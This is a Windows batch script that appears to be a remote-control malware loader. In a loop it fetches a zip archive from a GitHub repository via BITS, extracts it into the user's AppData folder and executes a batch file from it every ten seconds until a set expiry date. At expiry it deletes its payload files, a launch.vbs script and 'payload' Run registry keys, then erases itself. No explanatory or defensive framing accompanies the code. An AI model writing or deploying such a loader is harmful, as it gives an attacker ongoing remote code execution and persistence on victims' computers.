cd C:\users\%username%\AppData
powershell Import-Module BitsTransfer
set expire_date=REPtime
set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false
:begin
set CUR_YYYY=%date:~10,4%
set CUR_DD=%date:~4,2%
set CUR_MM=%date:~7,2%
set CUR_HH=%time:~0,2%
if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
set CUR_NN=%time:~3,2%
set CUR_SS=%time:~6,2%
set CUR_MS=%time:~9,2%
set current_time=%CUR_YYYY%%CUR_MM%%CUR_DD%%CUR_HH%%CUR_NN%%CUR_SS%
if %current_time% geq %expire_date% goto expire
powershell Start-BitsTransfer -source "https://github.com/Guest257351/Control/archive/refs/heads/main.zip" -Destination data.zip
>nul find "WebCmdletWebResponseException" WL1.zip && (
  goto offline
) || (
  goto online
)
:online
powershell Expand-Archive data.zip C:\users\%username%\AppData\scripts -force
cd C:\Users\%username%\AppData\scripts\Control-main
timeout 1 /NOBREAK >nul
call REPtxt.bat
timeout 10 /NOBREAK >nul
goto begin
:offline
timeout 10 /NOBREAK >nul
goto begin
:expire
if exist "C:\ProgramData\launch.vbs" set admin_launch=true
if %admin_launch% equ true echo administrator version detected
if exist "C:\users\%username%\AppData\payload.bat" (set payload_is_exist=1)
if %payload_is_exist% equ 1 (echo [33mpayload.bat detected.[0m) else (echo [33mpayload.bat not detected.[0m)
if exist "C:\users\%username%\AppData\control" (set control_is_exist=1)
if %control_is_exist% equ 1 (echo [33mcontrol folder detected.[0m) else (echo [33mcontrol folder not detected.[0m)
if exist "C:\users\%username%\AppData\cmd.bat" (set cmd_is_exist=1)
if %cmd_is_exist% equ 1 (echo [33mcmd.bat detected.[0m) else (echo [33mcmd.bat not detected.[0m)
REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "payload"
if %errorlevel% equ 0 set reg_value_exists=1 >nul
if %reg_value_exists% equ true (echo [33mregisrty value exists[0m) else (echo [33mregistry value not detected[0m)
if %admin_launch% neq true del "C:\Users\%username%\launch.vbs"
if %admin_launch% equ true del "C:\ProgramData\launch.vbs
if not exist "C:\Users\%username%\launch.vbs" (echo [92mlaunch.vbs removed[0m)
if %payload_is_exist% equ 1 del "C:\users\%username%\AppData\payload.bat /Q /F"
if %payload_is_exist% equ 1 (echo [92mpayload.bat removed[0m)
if %cmd_is_exist% equ 1 (del "C:\users\%username%\AppData\cmd.bat" /Q /F)
if %cmd_is_exist% equ 1 (echo [92mcmd.bat removed[0m)
if %control_is_exist% equ 1 (del "C:\users\%username%\AppData\control" /Q /F) 
if %control_is_exist% equ 1 (echo [92mcontrol folder removed[0m)
if %reg_value_exists% equ 1 (reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /f)>nul
if %reg_value_exists% equ 1 (echo [92mregistry value deleted[0m)
if %admin_launch% equ true (reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /f)>nul
if %admin_launch% equ true echo ([92mregistry value deleted[0m)
timeout 1 /NOBREAK >nul
call :deleteSelf&exit /b
:deleteSelf
start /b "" cmd /c del "%~f0"&exit /b